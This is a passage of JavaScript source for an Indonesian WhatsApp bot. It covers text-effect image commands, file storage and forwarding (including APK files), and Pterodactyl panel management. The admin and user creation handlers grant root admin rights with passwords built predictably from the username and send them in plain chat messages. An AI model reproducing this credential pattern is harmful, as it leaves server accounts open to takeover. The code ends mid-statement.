        case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':{

if (!text) return reply(`Example : ${prefix+command} Veemon Md`) 
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, text)
ptz.sendMessage(m.chat, { image: { url: haldwhd }, caption: `Done` }, { quoted: m })
}
break
        
        case 'shadow':
case 'write':
case 'romantic':
case 'burnpaper':
case 'smoke':
case 'narutobanner':
case 'love':
case 'undergrass':
case 'doublelove':
case 'coffecup':
case 'underwaterocean':
case 'smokyneon':
case 'starstext':
case 'rainboweffect':
case 'balloontext':
case 'metalliceffect':
case 'embroiderytext':
case 'flamingtext':
case 'stonetext':
case 'writeart':
case 'summertext':
case 'wolfmetaltext':
case 'nature3dtext':
case 'rosestext':
case 'naturetypography':
case 'quotesunder':
case 'shinetext':
{



if (!text) return reply(`Example : ${prefix + command} Veemon Md`);
    reply("sabar..")
let link;
if (/stonetext/.test(command))
link =
  'https://photooxy.com/online-3d-white-stone-text-effect-utility-411.html';
if (/writeart/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/write-art-quote-on-wood-heart-370.html';
if (/summertext/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/3d-summer-text-effect-367.html';
if (/wolfmetaltext/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/create-a-wolf-metal-text-effect-365.html';
if (/nature3dtext/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/make-nature-3d-text-effects-364.html';
if (/rosestext/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/yellow-roses-text-360.html';
if (/naturetypography/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/create-vector-nature-typography-355.html';
if (/quotesunder/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/quotes-under-fall-leaves-347.html';
if (/shinetext/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/rainbow-shine-text-223.html';
if (/shadow/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/shadow-text-effect-in-the-sky-394.html';
if (/write/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/write-text-on-the-cup-392.html';
if (/romantic/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/romantic-messages-for-your-loved-one-391.html';
if (/burnpaper/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/write-text-on-burn-paper-388.html';
if (/smoke/.test(command))
link =
  'https://photooxy.com/other-design/create-an-easy-smoke-type-effect-390.html';
if (/narutobanner/.test(command))
link =
  'https://photooxy.com/manga-and-anime/make-naruto-banner-online-free-378.html';
if (/love/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/create-a-picture-of-love-message-377.html';
if (/undergrass/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/make-quotes-under-grass-376.html';
if (/doublelove/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/love-text-effect-372.html';
if (/coffecup/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/put-any-text-in-to-coffee-cup-371.html';
if (/underwaterocean/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/creating-an-underwater-ocean-363.html';
if (/smokyneon/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/make-smoky-neon-glow-effect-343.html';
if (/starstext/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/write-stars-text-on-the-night-sky-200.html';
if (/rainboweffect/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/glow-rainbow-effect-generator-201.html';
if (/balloontext/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/royal-look-text-balloon-effect-173.html';
if (/metalliceffect/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/illuminated-metallic-effect-177.html';
if (/embroiderytext/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/create-embroidery-text-online-191.html';
if (/flamingtext/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/realistic-flaming-text-effect-online-197.html';
let dehe = await photoOxy(link, text);
ptz.sendMessage(
m.chat,
{ image: { url: dehe }, caption: `Done`},
{ quoted: m }
);
}
break;

    case 'setcmd': {
if (!isCreator) return m.reply('*Khusus Premium*')
if (!m.quoted) throw 'Reply Pesan!'
if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
if (!text) throw `Untuk Command Apa?`
let hash = m.quoted.fileSha256.toString('base64')
if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to change this sticker command'
global.db.data.sticker[hash] = {
text,
mentionedJid: m.mentionedJid,
creator: m.sender,
at: + new Date,
locked: false,
}
m.reply(`Done!`)
}
break
        
case 'delcmd': {
if (!isCreator) return m.reply('*Khusus Premium*')
if (!m.quoted) throw 'Reply Pesan!'
let hash = m.quoted.fileSha256.toString('base64')
if (!hash) throw `Tidak ada hash`
if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to delete this sticker command'
delete global.db.data.sticker[hash]
m.reply(`Done!`)
}
break

case 'listcmd': {
//if (isBan) return m.reply('*Kamu Telah Terbanned Oleh Owner*')
let teks = `list cmd`
ptz.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
}
break

case 'addpdf':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Nama pdf apa')
let teks = `${text}`
{
if (docunye.includes(teks)) return reply("Nama tersebut sudah di gunakan")
let delb = await ptz.downloadAndSaveMediaMessage(quoted)
docunye.push(teks)
await fsx.copy(delb, `./database/Docu/${teks}.pdf`)
fs.writeFileSync('./database/docu.json', JSON.stringify(docunye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan Pdf\nCek dengan cara ${prefix}listpdf`)
}
}
break

case 'delpdf':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Masukan query')
let teks = `${text}`
{
if (!docunye.includes(teks)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = docunye.indexOf(teks)
docunye.splice(wanu, 1)
fs.writeFileSync('./database/docu.json', JSON.stringify(docunye))
fs.unlinkSync(`./database/Docu/${teks}.pdf`)
reply(`Sukses delete pdf ${teks}`)
}
}
break

case 'listpdf': {
if (!isCreator) return m.reply('*Khusus Premium*')
let teksoooo = '┌──⭓「 *LIST PDF* 」\n│\n'
for (let x of docunye) {
teksoooo = `│⭔ ${x}\n`
}
teksoooo = `│\n└────────────⭓\n\n*Total ada : ${docunye.length} \n\n Contoh 1 : sendpdf ${botname} + sbuy reply pesan target* \n\n Contoh 2 : yopdf ${botname}`
m.reply(teksoooo)
}
break

case 'yopdf':{
if (!isCreator) return m.reply('*Khusus Premium*')
let teks = `${text}`
{
ptz.sendMessage(m.chat, { document: fs.readFileSync(`./database/Docu/${teks}.pdf`), mimetype: 'application/pdf', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
}
}
break

case 'sendpdf': {
if (!isCreator) return m.reply('*Khusus Premium*')
if (!text) return m.reply(`Lah, Reply Chat Orang Nya Masukin Text Yang Ada Di Listpdf`)
let teks = `${text}`
{
ptz.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./database/Docu/${teks}.pdf`), mimetype: 'application/pdf', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
m.reply(`Sukses Mengirim Pesan Pdf Ke ${m.quoted.sender}`)
}
}
break

case 'addzip':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Nama zip apa')
let teks = `${text}`
{
if (zipnye.includes(teks)) return reply("Nama tersebut sudah di gunakan")
let delb = await ptz.downloadAndSaveMediaMessage(quoted)
zipnye.push(teks)
await fsx.copy(delb, `./database/zip/${teks}.zip`)
fs.writeFileSync('./database/zip.json', JSON.stringify(zipnye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan zip\nCek dengan cara ${prefix}listzip`)
}
}
break

case 'delzip':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Masukan text yang ada di list zip')
let teks = `${text}`
{
if (!zipnye.includes(teks)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = zipnye.indexOf(teks)
zipnye.splice(wanu, 1)
fs.writeFileSync('./database/zip.json', JSON.stringify(zipnye))
fs.unlinkSync(`./database/zip/${teks}.zip`)
reply(`Sukses delete zip ${teks}`)
}
}
break

case 'listzip': {
if (!isCreator) return m.reply('*Khusus Premium*')
let teksooooo = '┌──⭓「 *LIST ZIP* 」\n│\n'
for (let x of zipnye) {
teksooooo = `│⭔ ${x}\n`
}
teksooooo = `│\n└────────────⭓\n\n*Total ada : ${zipnye.length} \n\n Contoh 1 : sendzip ${botname} + sambil reply pesan target* \n\n Contoh 2 : yozip ${botname}`
m.reply(teksooooo)
}
break

case 'yozip':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Masukan text yang ada di list zip')
let teks = `${text}`
{
ptz.sendMessage(m.chat, { document: fs.readFileSync(`./database/zip/${teks}.zip`), mimetype: 'application/zip', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
}
}
break

case 'sendzip': {
if (!isCreator) return m.reply('*Khusus Premium*')
if (!text) return m.reply(`Lah, Reply Chat Orang Nya Masukin Text Yang Ada Di Listzip`)
let teks = `${text}`
{
ptz.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./database/zip/${teks}.zip`), mimetype: 'application/zip', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
m.reply(`Sukses Mengirim Pesan Zip Ke ${m.quoted.sender}`)
}
}
break

case 'addapk':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Nama apk apa')
let teks = `${text}`
{
if (apknye.includes(teks)) return reply("Nama tersebut sudah di gunakan")
let delb = await ptz.downloadAndSaveMediaMessage(quoted)
apknye.push(teks)
await fsx.copy(delb, `./database/apk/${teks}.apk`)
fs.writeFileSync('./database/apk.json', JSON.stringify(apknye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan apk\nCek dengan cara ${prefix}listapk`)
}
}
break

case 'delapk':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Masukan text yang ada di listapk')
let teks = `${text}`
{
if (!apknye.includes(teks)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = apknye.indexOf(teks)
apknye.splice(wanu, 1)
fs.writeFileSync('./database/zip.json', JSON.stringify(apknye))
fs.unlinkSync(`./database/apk/${teks}.apk`)
reply(`Sukses delete Apk ${teks}`)
}
}
break

case 'listapk': {
if (!isCreator) return m.reply('*Khusus Premium*')
let teksoooooo = '┌──⭓「 *LIST APK* 」\n│\n'
for (let x of apknye) {
teksoooooo = `│⭔ ${x}\n`
}
teksoooooo = `│\n└────────────⭓\n\n*Total ada : ${apknye.length} \n\n Contoh 1 : sendapk ${botname} + sambil reply pesan target* \n\n Contoh 2 : yoapk ${botname}`
m.reply(teksoooooo)
}
break

case 'yoapk':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Masukan text yang ada di listapk')
let teks = `${text}`
{
ptz.sendMessage(m.chat, { document: fs.readFileSync(`./database/apk/${teks}.apk`), mimetype: 'application/vnd.android.package-archive', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
}
}
break

case 'sendapk': {
if (!isCreator) return m.reply('*Khusus Premium*')
if (!text) return m.reply(`Lah, Reply Chat Orang Nya Masukin Text Yang Ada Di Listzip`)
let teks = `${text}`
{
ptz.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { document: fs.readFileSync(`./database/apk/${teks}.apk`), mimetype: 'application/vnd.android.package-archive', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
m.reply(`Sukses Mengirim Pesan Apk Ke ${m.quoted.sender}`)
}
}
break

case 'addvn':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Nama audionya apa')
if (vnnye.includes(text)) return reply("Nama tersebut sudah di gunakan")
let delb = await ptz.downloadAndSaveMediaMessage(quoted)
vnnye.push(text)
await fsx.copy(delb, `./database/Audio/${text}.mp3`)
fs.writeFileSync('./database/vnadd.json', JSON.stringify(vnnye))
fs.unlinkSync(delb)
reply(`Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`)
}
break

case 'delvn':{
if (!isCreator) return m.reply('*Khusus Premium*')
if (args.length < 1) return reply('Masukan query')
if (!vnnye.includes(text)) return reply("Nama tersebut tidak ada di dalam data base")
let wanu = vnnye.indexOf(text)
vnnye.splice(wanu, 1)
fs.writeFileSync('./database/vnadd.json', JSON.stringify(vnnye))
fs.unlinkSync(`./database/Audio/${text}.mp3`)
reply(`Sukses delete vn ${text}`)
}
break

case 'listvn':{
//if (isBan) return m.reply('*Kamu Telah Terbanned Oleh Owner*')
 let teksooo = '┌──⭓「 *LIST VN* 」\n│\n'
for (let x of vnnye) {
teksooo += `│⭔ ${x}\n`
}
reply(teksooo)
}
break

case 'addmsg': {
if (!isCreator) return m.reply('*Khusus Premium*')
 if (!m.quoted) throw 'Reply Pesan Yang Ingin Disave Di Database'
 if (!text) throw `Example : ${prefix + command} nama file`
 let msgs = global.db.data.database
 if (text.toLowerCase() in msgs) throw `'${text}' telah terdaftar di list pesan`
 msgs[text.toLowerCase()] = quoted.fakeObj
m.reply(`Berhasil menambahkan pesan di list pesan sebagai '${text}'

Akses dengan ${prefix}getmsg ${text}

Lihat list Pesan Dengan ${prefix}listmsg`)
}
break

case 'sendlist': {
if (!isCreator) return m.reply('*Khusus Premium*')
 if (!text) throw `Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
 let msgs = global.db.data.database
 if (!(text.toLowerCase() in msgs)) throw `'${text}' tidak terdaftar di list pesan`
 ptz.copyNForward(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", msgs[text.toLowerCase()], true)
 m.reply(`Sukses Mengirim Pesan Ke ${m.quoted.sender}`)
}
break

case 'listmsg': {
//if (isBan) return m.reply('*Kamu Telah Terbanned Oleh Owner*')
 let msgs = global.db.data.database
let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
let teks = '「 LIST DATABASE 」\n\n'
for (let i of seplit) {
teks += `⬡ *Name :* ${i.nama}\n⬡ *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
}
m.reply(teks)
}
break

case 'delmsg': case 'deletemsg': {
if (!isCreator) return m.reply('*Khusus Premium*')
let msgs = global.db.data.database
if (!(text.toLowerCase() in msgs)) return m.reply(`'${text}' tidak terdaftar didalam list pesan`)
delete msgs[text.toLowerCase()]
m.reply(`Berhasil menghapus '${text}' dari list pesan`)
}
break

case 'getmsg': {
//if (isBan) return m.reply('*Kamu Telah Terbanned Oleh Owner*')
 if (!text) throw `Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
 let msgs = global.db.data.database
 if (!(text.toLowerCase() in msgs)) throw `'${text}' tidak terdaftar di list pesan`
 ptz.copyNForward(m.chat, msgs[text.toLowerCase()], true)
}
break        
        
        
        
        
        
        
        

        
        
        
        
        
        
        
        //  create panel  1gb - 8
       
case "admin": case "createadmin": {
if (!isCreator) return reply(`*Lu Siape? Fitur Ini Khusus Owner Gw!*`)

let s = q.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (!username) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let password = username + "019"
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
 "root_admin" : true,  
"password": password.toString()
})

})

let data = await f.json();

if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));

let user = data.attributes

let tks = `
TYPE: user

📡ID: ${user.id}
🌷UUID: ${user.uuid}
👤USERNAME: ${user.username}
📬EMAIL: ${user.email}
🦖NAME: ${user.first_name} ${user.last_name}
🔥LANGUAGE: ${user.language}
📊ADMIN: ${user.root_admin}
☢️CREATED AT: ${user.created_at}

🖥️LOGIN: ${domain}
`
    const listMessage = {

        text: tks,

    }

	

    await ptz.sendMessage(m.chat, listMessage)

    await ptz.sendMessage(nomornya, {

        text: `*BERIKUT DETAIL AKUN ADMIN  PANEL ANDA*\n

USERNAME :  ${username}
PASSWORD: ${password}
LOGIN: ${domain}

*NOTE : OWNER HANYA MENGIRIM 1X DATA AKUN ANDA MOHON DI SIMPAN BAIK BAIK KALAU DATA AKUN ANDA HILANG OWNER TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*
• GARANSI CUMA 1X
• KLAIM GARANSI HARUS SEND BUKTI PEMBELIAN
• JANGAN RUSUH SERVER LAIN
• CREATE PANEL SECUKUPNYA


`,

    })

} 
break
case "listadmin": {
  if (!isPremium) return reply(`Maaf, Anda tidak dapat melihat daftar pengguna.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey2
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list admin:\n\n";

  for (let user of users) {
    let u = user.attributes;
    if (u.root_admin) {
      messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
      messageText += `${u.username}\n`;
      messageText += `${u.first_name} ${u.last_name}\n\n`;
    }
  }

  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Admin: ${res.meta.pagination.count}`;

  await ptz.sendMessage(m.chat, { text: messageText }, { quoted: m });

  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
case "addsrv": {
let s = text.split(',');
if (s.length < 7) return reply(`*Format salah!*

Penggunaan:
${prefix + command} name,tanggal,userId,eggId,locationId,memory/disk,cpu`)
let name = s[0];
let desc = s[1] || ''
let usr_id = s[2];
let egg = s[3];
let loc = s[4];
let memo_disk = s[5].split`/`;
let cpu = s[6];
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let data = await f1.json();
let startup_cmd = data.attributes.startup

let f = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo_disk[0],
"swap": 0,
"disk": memo_disk[1],
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
reply(`*SUCCESSFULLY ADD SERVER*

TYPE: ${res.object}

ID: ${server.id}
UUID: ${server.uuid}
NAME: ${server.name}
DESCRIPTION: ${server.description}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
CREATED AT: ${server.created_at}`)
}
break
case 'spanel': case 'sendpanel': {
		 if (!isPremium) return reply(`NGAPAIN ANJG`)
          if (!text) return reply(`Example : ${prefix + command} .spanel +62 831-2344-8708,pass,link.xyz,user`)
           reply('Pesanan Telah Sukses Dikirim') 
            var mon = args.join(' ')
            var m1 = mon.split(",")[0]
            var m22 = mon.split(",")[1]
            var m3 = mon.split(",")[2]
  var m99 = mon.split(",")[3]
                    let mq1 = m.quoted ? m.quoted.sender : mq1 ? mq1.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
                  let ownernya = owner + '@s.whatsapp.net'
               let me = m.sender
               let ments = [mq1, ownernya, me]




ptz.sendMessage(mq1, {text:`*───❖》Ziyo Offcial《❖───*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*📦 Pesananmu Datang 📦*\nHari : ${""}*\n*Tanggal : ${tanggal2}*\n*Jam : ${time}*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*[+] Username : ${m99}*\n*[+] Password : ${m22}*\n*[+] Login : ${m3}*\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n*_Note : Jangan Lupa Ganti Password Agar Terhindar Dari Pencurian Akun Panel_*\n`})  
}
            break             
case "webpanel":
if (!isPremium) return reply("Tak nak")
ewe = `nih kak ${domain}`
await ptz.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: ewe,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
break
case 'suspend': {
            if (!isCreator) return reply(`Sory Cik Lu Siapa Bjirr`)
            let srv = args[0]
            if (!srv) return reply('ID nya mana?')
            let f = await fetch(domain + "/api/application/servers/" + srv + "/suspend", {
                "method": "POST",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey2
                }
            })
            let res = f.ok ? {
                errors: null
            } : await f.json()
            if (res.errors) return reply('*SERVER NOT FOUND*')
           reply('*BERHASIL SUSPEND..*')
        }
            break
case 'unsuspend': {
            if (!isCreator) return reply(`Sory Cik Lu Siapa Bjirr`)
            let srv = args[0]
            if (!srv) return reply('ID nya mana?')
            let f = await fetch(domain + "/api/application/servers/" + srv + "/unsuspend", {
                "method": "POST",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey2
                }
            })
            let res = f.ok ? {
                errors: null
            } : await f.json()
            if (res.errors) return reply('*SERVER NOT FOUND*')
           reply('*BERHASIL BUKA SUSPEND..*')
        }
            break
case 'startsrv': case 'stopsrv': case 'restartsrv': {
let action = command.replace('srv', '')
if (!isPremium) return reply('kusus Prem')
let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/ptz/servers/" + srv + "/power", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"signal": action
})
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
reply(`*SUCCESSFULLY ${action.toUpperCase()} THE SERVER*`)
}
break
        case "1gb": {
        if (!isPremium) return reply(`Khusus Orang Spesial`)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username + "1GB"
let egg = global.eggsnya
let loc = global.location
let memo = "1024"
let cpu = "50"
let disk = "0"
let email = username + "505@gmail.com"
akunlo = "https://telegra.ph/file/a12558476b9aa179544a0.jpg" 
if (!u) return
let d = (await ptz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `*${m2}[ Halo kak ${pushname} Ada Panel ]${m2}*

*- ⎙ Data Akun Panel Anda  -*

*• USERNAME* : ${user.username}
*• PASSWORD* : ${password}
*• LOGIN* : ${domain}

*Note* `+readmore+`

[1] *OWNER HANYA MENGIRIM 1X DATA AKUN ANDA*
 MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI

[2] *GARANSI CUMA 1X* 
 KLAIM GARANSI HARUS SEND BUKTI PEMBELIAN

[3] *JANGAN RUN SC DDOS DI PANEL*  
ATAU OWNER AKAN MENGHAPUS AKUN DAN SERVER TANPA REFF
`

let tekss1 = ctf

let msghhhhhhhhh = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
   mentionedJid: [m.sender], 
   isForwarded: false, 
   businessMessageForwardInfo: { businessOwnerJid: ptz.decodeJid(ptz.user.id) },
   externalAdReply: { 
     title: 'Ziyo', 
     thumbnailUrl: 'https://telegra.ph/file/a61add223eb2661c1f38e.jpg', 
     sourceUrl: '',
     mediaType: 2,
